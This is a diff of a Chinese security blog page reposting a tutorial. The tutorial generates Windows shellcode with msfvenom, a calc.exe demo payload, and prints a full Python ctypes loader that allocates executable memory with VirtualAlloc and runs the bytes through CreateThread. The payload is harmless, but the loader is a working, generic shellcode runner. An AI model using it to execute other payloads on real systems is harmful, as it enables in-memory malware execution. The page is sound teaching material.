@@ -79,19 +79,16 @@
 
 
 
-<meta name="description" content="msf生成shellcode，并使用Python执行shellcode转载自：https:&#x2F;&#x2F;pwpath.com&#x2F;archives&#x2F;128&#x2F; msfMetasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 想知道更多内容请👉点击这里。 shellcodeshellcode是一段用于利用软件漏洞而执">
+<meta name="description" content="msf生成shellcode，并使用Python执行shellcode转载自：https:&#x2F;&#x2F;pwpath.com&#x2F;archives&#x2F;128&#x2F; msfMetasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为1">
 <meta name="keywords" content="网络安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="python执行msf生成的shellcode">
 <meta property="og:url" content="http:&#x2F;&#x2F;kanatsux.github.io&#x2F;2020&#x2F;09&#x2F;04&#x2F;python%E6%89%A7%E8%A1%8Cmsf%E7%94%9F%E6%88%90%E7%9A%84shellcode&#x2F;index.html">
 <meta property="og:site_name" content="打怪升级的司图">
-<meta property="og:description" content="msf生成shellcode，并使用Python执行shellcode转载自：https:&#x2F;&#x2F;pwpath.com&#x2F;archives&#x2F;128&#x2F; msfMetasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 想知道更多内容请👉点击这里。 shellcodeshellcode是一段用于利用软件漏洞而执">
+<meta property="og:description" content="msf生成shellcode，并使用Python执行shellcode转载自：https:&#x2F;&#x2F;pwpath.com&#x2F;archives&#x2F;128&#x2F; msfMetasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https:&#x2F;&#x2F;secure.gravatar.com&#x2F;avatar&#x2F;58699e8cbf046a48614289c68dff3f67?s=65&amp;r=X&amp;d=">
-<meta property="og:image" content="https:&#x2F;&#x2F;secure.gravatar.com&#x2F;avatar&#x2F;52fbed7ab0332c08e1249a9c4553b08a?s=65&amp;r=X&amp;d=">
-<meta property="og:updated_time" content="2020-09-08T09:29:31.093Z">
+<meta property="og:updated_time" content="2021-10-09T09:42:22.111Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;secure.gravatar.com&#x2F;avatar&#x2F;58699e8cbf046a48614289c68dff3f67?s=65&amp;r=X&amp;d=">
 
 
 
@@ -347,7 +344,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  839
+                  813
                 </span>
               
 
@@ -385,25 +382,14 @@
 
       
         <h1 id="msf生成shellcode，并使用Python执行shellcode"><a href="#msf生成shellcode，并使用Python执行shellcode" class="headerlink" title="msf生成shellcode，并使用Python执行shellcode"></a>msf生成shellcode，并使用Python执行shellcode</h1><p>转载自：<a href="https://pwpath.com/archives/128/" target="_blank" rel="noopener">https://pwpath.com/archives/128/</a></p>
-<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 想知道更多内容请👉<a href="https://pwpath.com/go/aHR0cHM6Ly93d3cuYmFpZHUuY29tL3M|d2Q9bWV0YXNwbG9pdA==" target="_blank" rel="noopener">点击这里</a>。</p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</p>
 <h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p>
 <h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>命令如下：<code>msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f python C</code><br><code>msfcenom</code>实际上是调用了metasploit自带的一条命令，用于生成payload，这里要注意，网络上广为流传的一些教程中依然在使用<code>msfpayload</code>命令，新版本早已更换了此命令。<br><code>-p</code> 参数指定我们使用的Payload。<br><code>-f</code> 按照指定语言输出payload<br><code>EXITFUCN=thread</code> 主要是声明退出仅线程退出，否则会将注入的线程也一并退出。<br>末尾的<code>C</code>指明是C语言来编写shellcode</p>
 <h2 id="python执行shellcode代码"><a href="#python执行shellcode代码" class="headerlink" title="python执行shellcode代码"></a>python执行shellcode代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"</span></span><br><span class="line">buf += <span class="string">b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"</span></span><br><span class="line">buf += <span class="string">b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"</span></span><br><span class="line">buf += <span class="string">b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"</span></span><br><span class="line">buf += <span class="string">b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"</span></span><br><span class="line">buf += <span class="string">b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"</span></span><br><span class="line">buf += <span class="string">b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"</span></span><br><span class="line">buf += <span class="string">b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"</span></span><br><span class="line">buf += <span class="string">b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"</span></span><br><span class="line">buf += <span class="string">b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"</span></span><br><span class="line">buf += <span class="string">b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line">buf += <span class="string">b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"</span></span><br><span class="line">buf += <span class="string">b"\x78\x65\x00"</span></span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
 
-<p><strong>Python</strong></p>
-<h4 id="3-comments"><a href="#3-comments" class="headerlink" title="3 comments"></a>3 comments</h4><ol>
-<li><p><img src="https://secure.gravatar.com/avatar/58699e8cbf046a48614289c68dff3f67?s=65&r=X&d=" alt="img"></p>
-<p><strong>yc</strong></p>
-<p>1 Day Ago</p>
-<p>msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f python C<br>这条命令生成的shellcode用例子代码没有弹出计算器呢</p>
-<p><a href="https://pwpath.com/archives/128/?replyTo=33#respond-post-128" target="_blank" rel="noopener">Reply</a></p>
-<ol>
-<li><p><img src="https://secure.gravatar.com/avatar/52fbed7ab0332c08e1249a9c4553b08a?s=65&r=X&d=" alt="img"></p>
-<p><strong><a href="https://pwpath.com/" target="_blank" rel="noopener">伸懒腰的猫</a></strong></p>
-<p>1 Day Ago</p>
-<p><strong><a href="https://pwpath.com/archives/128/#comment-33" target="_blank" rel="noopener">@yc</a></strong>msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f python C<br>使用这一条命令试试</p>
-</li>
-</ol>
+<h4 id="comments"><a href="#comments" class="headerlink" title="comments"></a>comments</h4><ol>
+<li><p>msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f python C<br>这条命令生成的shellcode用例子代码没有弹出计算器呢</p>
+<p>[Reply] msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f python C<br>使用这一条命令试试</p>
 </li>
 </ol>
 
@@ -557,7 +543,7 @@
                 <a href="/archives/">
                 
               
-                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -647,7 +633,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#msf生成shellcode，并使用Python执行shellcode"><span class="nav-number">1.</span> <span class="nav-text">msf生成shellcode，并使用Python执行shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">1.1.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.2.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成shellcode"><span class="nav-number">1.3.</span> <span class="nav-text">生成shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python执行shellcode代码"><span class="nav-number">1.4.</span> <span class="nav-text">python执行shellcode代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-comments"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">3 comments</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#msf生成shellcode，并使用Python执行shellcode"><span class="nav-number">1.</span> <span class="nav-text">msf生成shellcode，并使用Python执行shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">1.1.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.2.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成shellcode"><span class="nav-number">1.3.</span> <span class="nav-text">生成shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python执行shellcode代码"><span class="nav-number">1.4.</span> <span class="nav-text">python执行shellcode代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#comments"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">comments</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -681,7 +667,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">507.5k</span>
+    <span title="Site words total count">505.9k</span>
   
 </div>
 
